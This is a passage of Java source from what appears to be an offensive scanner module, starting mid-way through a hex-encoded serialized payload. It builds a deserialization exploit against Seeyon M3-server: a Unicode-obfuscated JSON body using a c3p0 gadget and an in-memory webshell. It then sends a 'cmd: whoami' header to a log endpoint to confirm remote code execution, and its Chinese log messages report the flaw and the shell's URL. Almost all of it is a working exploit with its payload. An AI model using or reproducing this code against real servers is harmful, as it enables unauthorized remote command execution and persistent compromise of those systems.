04bd001b5903123d53b6003e191004bd001d5903190e53b6001e3a07190cb60004123f04bd001b5903191053b6001c190c04bd001d5903190753b6001e57043b1a990006a70009840901a7fe2f1a990006a70011a700083a05a70003840401a7fd32a700044bb10008009500a000a3001200c300d100d400120213028602890040002e003902ed0043003c005702ed0043005a007a02ed0043007d02e702ed0043000002f802fb004300030049000000fe003f0000000d0002000e0009000f001300100018001100240012002e001400340015003c001600430017005a001800650019006a001a0072001b007d001c0088001d008d001e0095002000a0002300a3002100a5002200b6002400bb002500c3002700d1002a00d4002800d6002900e1002b00e6002c00ee002d00f9002e00fe002f010c0030011b0031012600320131003301360034013e003501570036017d0037018a003801b5003901f0003a0213003c021a003d0221003e0264003f0286004402890040028b00410292004202b2004302d4004502d6004702dd003002e3004902ea004c02ed004a02ef004b02f2001202f8005002fb004f02fc0051004a000000d4001500a50011005b005c000800d6000b005b005c0008021a006c005d005e000f02920042005d005e0010028b0049005f0060000f01f000e600610062000d021300c300630064000e012601b700650066000a013e019f00670066000b0157018600680066000c010f01d40069006a0009003402b6006b006c0005004302a7006d006e000600720278006f00660007010c01de00700071000802ef0003005b00720005002702d10073006a0004000202f6007400750000000902ef007600770001001302e5007800790002002402d4007a007b0003007c000000a80017ff002700050107007d07007e070009010000fc001407007ffc001a07008002fc002207008165070082125d0700820cfd002d07008301fe00cb07008107008107008152070084ff009a000f0107007d07007e0700090107007f0700800700810700830107008107008107008107008407003d0001070085fb004af90001f80006fa0005ff000600050107007d07007e0700090100004207008604ff0005000000004207008600000100870000000200887571007e0010000001d4cafebabe00000033001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d000000060001000000c7000e0000000c000100000005000f001200000002001300000002001400110000000a00010002001600100009707400084448434e57504c53707701007871007e000d78";
        String data = "[{\"userMessageId\":\"{\\\"@\\u0074\\u0079\\u0070\\u0065\\\":\\\"\\u0063\\u006f\\u006d\\u002e\\u006d\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065\\u002e\\u0076\\u0032\\u002e\\u0063\\u0033\\u0070\\u0030\\u002e\\u0057\\u0072\\u0061\\u0070\\u0070\\u0065\\u0072\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0050\\u006f\\u006f\\u006c\\u0044\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\\",\\\"\\u0075\\u0073\\u0065\\u0072\\u004f\\u0076\\u0065\\u0072\\u0072\\u0069\\u0064\\u0065\\u0073\\u0041\\u0073\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\\":\\\"\\u0048\\u0065\\u0078\\u0041\\u0073\\u0063\\u0069\\u0069\\u0053\\u0065\\u0072\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0064\\u004d\\u0061\\u0070:"+Memory_Horse+";\\\"}|\",\"channelId\":\"111\",\"title\":\"111\",\"content\":\"222\",\"deviceType\":\"androidphone\",\"serviceProvider\":\"baidu\",\"deviceFirm\":\"other\"}]";
        switch (type) {
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target + url);
                httpRequest.addHeaders("Content-Type","application/json");
                httpRequest.Post(data);
                HttpRequest httpRequest1 = new HttpRequest(target+"/mobile_portal/api/systemLog/pns/loadLog/app.log");
                httpRequest1.addHeaders("cmd","whoami");
                Response response1 = httpRequest1.Get("");
                if (response1.statusCode==200&& response1.responseBody.contains("success")){
                    WriteLog("\n[*]存在 M3-server反序列化RCE");
                    WriteLog("\n[*]访问链接："+target+"/mobile_portal/api/systemLog/pns/loadLog/app.log");
                    WriteLog("\n[*]访问头加cmd: whoami");
                }else {
                    WriteLog("\n[*]不存在漏洞");
                }
        }
    }


}
